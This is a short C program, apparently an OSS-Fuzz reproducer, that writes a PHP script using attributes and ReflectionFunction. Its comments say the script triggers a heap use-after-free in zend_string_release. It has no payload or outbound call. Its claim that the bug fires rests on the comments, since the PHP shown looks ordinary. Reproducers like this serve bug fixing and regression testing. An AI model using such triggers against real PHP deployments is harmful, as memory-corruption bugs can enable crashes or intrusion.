#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PoC for oss-fuzz:371445205 */
/* Triggers: heap-use-after-free in zend_string_release (PHP) */
/* Vuln class: use_after_free */

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Write PHP code that triggers use-after-free via attributes */
    fprintf(f, "<?php\n");
    fprintf(f, "#[Attribute]\n");
    fprintf(f, "class A {}\n");
    fprintf(f, "#[A]\n");
    fprintf(f, "function f() {}\n");
    fprintf(f, "$r = new ReflectionFunction('f');\n");
    fprintf(f, "unset($r);\n");
    fprintf(f, "echo 'done';\n");

    fclose(f);
    return 0;
}